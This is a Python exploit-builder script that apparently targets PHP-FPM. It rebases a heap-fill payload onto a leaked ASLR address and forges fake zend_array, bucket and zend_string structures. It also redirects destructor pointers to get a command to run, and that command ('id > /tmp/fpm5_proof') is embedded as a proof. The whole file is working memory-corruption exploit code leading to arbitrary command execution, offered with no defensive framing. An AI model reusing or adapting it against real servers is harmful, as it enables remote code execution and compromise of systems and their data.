#!/usr/bin/env python3
"""Rebase the calibrated fillU.bin onto a leaked d address.

fillU.bin holds only d-relative absolute pointers (d, d+0x38/0x800/0xF00/
0xF06); a target whose ASLR base differs needs every qword inside
[OLD_D, OLD_D+0x4000) shifted by the same delta.
"""
import argparse
import struct

OLD_D = 0x7FFFF63B9000
SPAN = 0x4000


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--d", type=lambda x: int(x, 0), required=True)
    ap.add_argument("--heap", type=lambda x: int(x, 0), default=None,
                    help="leaked heap base for session key strings (defaults to d-0x15cbd8)")
    ap.add_argument("--infile", default="payload/fillU.bin")
    ap.add_argument("--out", default="payload/fillU_native.bin")
    ap.add_argument("--noht", action="store_true")
    ap.add_argument("--e0", action="store_true",
                    help="start at E0 (d+0x800) and target the session HT pDestructor")
    ap.add_argument("--nogdb", action="store_true",
                    help="build the fill-resident fake table frame (no gdb frame write)")
    a = ap.parse_args()

    buf = bytearray(open(a.infile, "rb").read())
    delta = a.d - OLD_D
    hits = 0
    for off in range(0, len(buf) - 7):
        q = struct.unpack_from("<Q", buf, off)[0]
        if OLD_D <= q < OLD_D + SPAN:
            struct.pack_into("<Q", buf, off, q + delta)
            hits += 1
    if a.noht:
        struct.pack_into("<q", buf, 0x17E8, 0)
        struct.pack_into("<q", buf, 0x18E8, 0)
        print("noht: dtor writes redirected into fill")
    if delta % 16 == 0:
        e0 = struct.unpack_from("<q", buf, 0x17E8)[0]
        if a.e0:
            struct.pack_into("<q", buf, 0x17E8, -103502)
            struct.pack_into("<Q", buf, 0xFF8, a.d + 0x800)
            print("E0 data base -> d+0x800, used_slots -> -103502 (nTableSize then pDestructor)")
        elif e0 == -129:
            struct.pack_into("<q", buf, 0x17E8, -103501)
            print("E0 a -> pDestructor slot")
        struct.pack_into("<q", buf, 0x18E8, -103521)
        FT = 0x1DE8              # fake zend_array at d+0xE00 (fill)
        AR = a.d + 0xE80         # buckets; hash slots live 0x28 before
        struct.pack_into("<I", buf, FT + 0x00, 1)
        struct.pack_into("<I", buf, FT + 0x04, 7)
        struct.pack_into("<I", buf, FT + 0x08, 0x11)
        struct.pack_into("<I", buf, FT + 0x0C, 0xfffffff0)
        struct.pack_into("<Q", buf, FT + 0x10, AR)
        struct.pack_into("<I", buf, FT + 0x18, 5)
        struct.pack_into("<I", buf, FT + 0x1C, 5)
        struct.pack_into("<I", buf, FT + 0x20, 16)
        struct.pack_into("<Q", buf, FT + 0x30, 0x555555a0e3a0)
        slot_base = (AR - 0x28) - a.d + 0xFE8
        for i in range(10):
            struct.pack_into("<I", buf, slot_base + i * 4, 0xFFFFFFFF)
        keys = [('a', -0x4F08, 0x800000000002b606), ('b', -0x4F28, 0x800000000002b607),
                ('c', -0x4F48, 0x800000000002b608), ('d', -0x4F68, 0x800000000002b609),
                ('e', -0x4F88, 0x800000000002b60a)]
        base = a.heap if a.heap is not None else a.d - 0x15cbd8
        V = (AR - a.d) + 0xFE8
        for i, (name, off, h) in enumerate(keys):
            b = V + i * 0x20
            struct.pack_into("<Q", buf, b + 0x10, h)
            struct.pack_into("<Q", buf, b + 0x18, (base + off) & 0xFFFFFFFFFFFFFFFF)
            struct.pack_into("<I", buf, b + 0x0C, 0xFFFFFFFF)
            si = -10 + i
            struct.pack_into("<I", buf, slot_base + (si + 10) * 4, i)
        CMD = b"id > /tmp/fpm5_proof"
        ST = V + 0xE0
        struct.pack_into("<Q", buf, V + 0x08, 1)
        struct.pack_into("<I", buf, V + 0x2C, 1)
        struct.pack_into("<Q", buf, V + 0x50, a.d + (ST - 0xFE8))
        struct.pack_into("<Q", buf, V + 0x58, 6)
        struct.pack_into("<Q", buf, ST + 0x10, len(CMD))
        buf[ST + 0x18:ST + 0x18 + len(CMD)] = CMD
        buf[ST + 0x18 + len(CMD)] = 0
        struct.pack_into("<Q", buf, 0x1008, a.d + 0xE00)
        print("fake table + frame at fill %#x, keys placed, ref_props set" % V)
        ld = struct.unpack_from("<Q", buf, 0xFF8)[0]
        if not a.e0 and a.d + 0x800 <= ld < a.d + 0x4000:
            struct.pack_into("<Q", buf, 0xFF8, a.d + 0x900)
            print("last_dtor -> d+0x900")
        print("E1 @0x18E8 used_slots -> -103519")
    if a.nogdb:
        # E0 prelude: four harmless slots then last_dtor = E2
        struct.pack_into("<q", buf, 0x17E8, -132)
        struct.pack_into("<Q", buf, 0xFF8, a.d + 0x800)
        # E2 at d+0xA00: c320 arData, c330 nTableSize, c340 pDestructor
        struct.pack_into("<q", buf, 0x19E8, -103535)
        V = 0x1E68                      # d+0xE80
        # clear the 16 hash slots (mask -16) and 8 slots (mask -8)
        struct.pack_into("<16I", buf, V - 0x40, *([0xFFFFFFFF] * 16))
        # bucket 0: frame opline/call, h=return_value, key=func
        struct.pack_into("<Q", buf, V + 0x00, 0)
        struct.pack_into("<I", buf, V + 0x08, 1)
        struct.pack_into("<Q", buf, V + 0x10, 0)
        struct.pack_into("<Q", buf, V + 0x18, 0)
        # bucket 1: num_args = Z_NEXT = 1, key 0 (encoder skips)
        struct.pack_into("<I", buf, V + 0x20 + 0x0C, 1)
        struct.pack_into("<Q", buf, V + 0x20 + 0x18, 0)
        # bucket 2: h = command string, key = fake 'c' at d+0x106 (low byte 6)
        ST = 0xFB0
        FS = 0x106
        struct.pack_into("<I", buf, V + 0x40 + 0x08, 1)      # val type IS_NULL
        struct.pack_into("<Q", buf, V + 0x40 + 0x10, a.d + ST)
        struct.pack_into("<Q", buf, V + 0x40 + 0x18, a.d + FS)
        # fake zend_string "c" at d+0x106
        foff = FS + 0xFE8
        struct.pack_into("<Q", buf, foff + 0x08, 0)
        struct.pack_into("<Q", buf, foff + 0x10, 1)
        buf[foff + 0x18] = ord("c")
        # command zend_string at d+0xFB0
        CMD = b"id>/tmp/fpm5_proof"
        coff = ST + 0xFE8
        struct.pack_into("<Q", buf, coff + 0x08, 0)
        struct.pack_into("<Q", buf, coff + 0x10, len(CMD))
        buf[coff + 0x18:coff + 0x18 + len(CMD)] = CMD
        buf[coff + 0x18 + len(CMD)] = 0
        print("nogdb frame: arData=%#x ST=%#x fake_c=%#x" % (a.d + 0xE80, a.d + ST, a.d + FS))
    open(a.out, "wb").write(buf)
    print("wrote %s d=%#x delta=%#x qwords=%d" % (a.out, a.d, delta, hits))


if __name__ == "__main__":
    main()
